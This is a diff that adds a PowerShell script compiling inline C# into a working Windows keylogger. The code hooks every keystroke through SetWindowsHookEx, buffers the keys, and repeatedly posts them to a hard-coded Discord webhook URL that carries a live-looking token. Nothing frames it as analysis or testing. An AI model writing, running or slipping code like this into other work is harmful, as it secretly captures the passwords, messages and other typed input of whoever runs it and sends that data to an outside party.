@@ -1,0 +1,93 @@
+$w='https://discord.com/api/webhooks/1483556320249643190/Xn4i-hsSyMWSmnRl4sScGy0XKHTcsq7V7cVuL6dnk7YsmIN36omJCoUD4co_LQg9m6Fa'
+
+$code = @"
+
+using System;
+
+using System.Runtime.InteropServices;
+
+using System.Windows.Forms;
+
+using System.Net.Http;
+
+using System.Text;
+
+public class KL {
+
+    [DllImport("user32.dll")]
+
+    static extern IntPtr SetWindowsHookEx(int id, LowLevelKeyboardProc cb, IntPtr hmod, uint tid);
+
+    [DllImport("user32.dll")]
+
+    static extern bool UnhookWindowsHookEx(IntPtr hook);
+
+    [DllImport("user32.dll")]
+
+    static extern IntPtr CallNextHookEx(IntPtr hook, int code, IntPtr w, IntPtr l);
+
+    [DllImport("kernel32.dll")]
+
+    static extern IntPtr GetModuleHandle(string name);
+
+    delegate IntPtr LowLevelKeyboardProc(int code, IntPtr w, IntPtr l);
+
+    static IntPtr hookId;
+
+    static LowLevelKeyboardProc proc;
+
+    static string buf = "";
+
+    static HttpClient http = new HttpClient();
+
+    static string webhook = "";
+
+    public static void Start(string wh) {
+
+        webhook = wh;
+
+        proc = HookCallback;
+
+        hookId = SetWindowsHookEx(13, proc, GetModuleHandle(null), 0);
+
+        System.Windows.Forms.Application.Run();
+
+    }
+
+    static IntPtr HookCallback(int code, IntPtr w, IntPtr l) {
+
+        if (code >= 0 && w == (IntPtr)0x0100) {
+
+            int vk = Marshal.ReadInt32(l);
+
+            string key = ((System.Windows.Forms.Keys)vk).ToString();
+
+            if(key.Length == 1) buf += key;
+
+            else buf += "["+key+"]";
+
+            if(buf.Length > 20) {
+
+                string b = buf; buf = "";
+
+                http.PostAsync(webhook,
+
+                    new StringContent("{\"content\":\""+b+"\"}",
+
+                    System.Text.Encoding.UTF8, "application/json"));
+
+            }
+
+        }
+
+        return CallNextHookEx(hookId, code, w, l);
+
+    }
+
+}
+
+"@
+
+Add-Type -TypeDefinition $code -ReferencedAssemblies System.Windows.Forms,System.Net.Http
+
+[KL]::Start($w)
